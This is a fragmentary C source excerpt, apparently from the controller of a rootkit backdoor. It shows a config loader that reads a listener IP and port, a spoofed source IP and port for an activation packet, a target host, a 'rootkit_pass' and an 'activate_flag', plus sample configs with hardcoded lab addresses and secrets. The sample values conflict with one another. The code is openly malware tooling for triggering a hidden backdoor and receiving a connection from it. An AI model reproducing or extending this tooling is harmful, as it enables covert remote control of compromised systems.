...
/*
set lhost 192.168.111.189
set lport 4444
set srchost 192.168.111.181
set srcport 666
set rhost 192.168.111.71
set rport 22
set prot tcp
set pass s3cr3t
set token hax0r
*/
// char *var_array[] = {"192.168.111.189", "4444", "192.168.111.181", "666", "192.168.111.71",\
 "222", "tcp", "s3cr3t", "hax0r"};
...
int load_config(char* config_file_path){
    if((access(config_file_path,F_OK))!=-1)  // if config file exists
    {   
        debug_printf("config file exists, load config to global variable.\n"); 
        unsigned long f_size = get_file_size(config_file_path);
        FILE *fp = NULL;
        char buff[f_size+1] ;       
        fp = fopen(config_file_path, "r");
        if(fp == NULL){printf("read config file error");return -1;}
        fgets(buff, f_size+1, (FILE*)fp); // notice fgets() will put '\0' to char* end, so we need to add 1 byte
        fclose(fp);
        j_config = cJSON_Parse(buff);
		debug_printf("\ncjson parse ok.\n");
        if (j_config == NULL) { // if parse json error
            debug_printf("\nconfig json parse error!!");
            // do something else ..
            return -1;      
        }
		//{"local_listen_ip":"192.168.111.189","local_listen_port":"4444","activatepPackage_fake_src_ip":"192.168.111.100","activatepPackage_fake_src_port":"48354","target_ip":"192.168.111.71","target_port":"69","activate_package_protocol":"tcp","rootkit_pass":"s3cr3t","activate_flag":"hax0r"}
        // load to global variable
		if (cJSON_GetObjectItem(j_config, "local_listen_ip"))
			var_array[0] = cJSON_GetObjectItem(j_config, "local_listen_ip")->valuestring;
		if (cJSON_GetObjectItem(j_config, "local_listen_port"))
			var_array[1] = cJSON_GetObjectItem(j_config, "local_listen_port")->valuestring;
		if (cJSON_GetObjectItem(j_config, "activatepPackage_fake_src_ip"))
			var_array[2] = cJSON_GetObjectItem(j_config, "activatepPackage_fake_src_ip")->valuestring;
		if (cJSON_GetObjectItem(j_config, "activatepPackage_fake_src_port"))
			var_array[3] = cJSON_GetObjectItem(j_config, "activatepPackage_fake_src_port")->valuestring;
		if (cJSON_GetObjectItem(j_config, "target_ip"))
			var_array[4] = cJSON_GetObjectItem(j_config, "target_ip")->valuestring;
		if (cJSON_GetObjectItem(j_config, "target_port"))
			var_array[5] = cJSON_GetObjectItem(j_config, "target_port")->valuestring;
		if (cJSON_GetObjectItem(j_config, "activate_package_protocol"))
			var_array[6] = cJSON_GetObjectItem(j_config, "activate_package_protocol")->valuestring;
		if (cJSON_GetObjectItem(j_config, "rootkit_pass"))
			var_array[7] = cJSON_GetObjectItem(j_config, "rootkit_pass")->valuestring;
		if (cJSON_GetObjectItem(j_config, "activate_flag"))
			var_array[8] = cJSON_GetObjectItem(j_config, "activate_flag")->valuestring;
...
{
	if (argc == 1){
		printf("usage: ./elf <config_file_path>\n");
		return 0;
	}
	if (argv[1]){
